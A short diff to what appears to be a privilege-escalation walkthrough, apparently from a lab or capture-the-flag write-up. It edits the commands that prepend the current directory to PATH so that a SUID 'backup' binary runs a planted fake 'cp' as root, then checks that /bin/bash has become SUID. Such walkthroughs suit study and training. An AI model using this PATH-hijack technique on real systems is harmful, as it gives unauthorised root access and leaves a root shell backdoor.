@@ -327,7 +327,8 @@ Make it executable, prepend `.` to `PATH`, and run the binary.
 
 ```bash
 chmod +x cp
-PATH=.:$PATH ./backup
+export PATH=.:$PATH
+./backup
 ```
 
 The SUID binary calls `./cp` as root. Check `/bin/bash` now has the SUID bit.
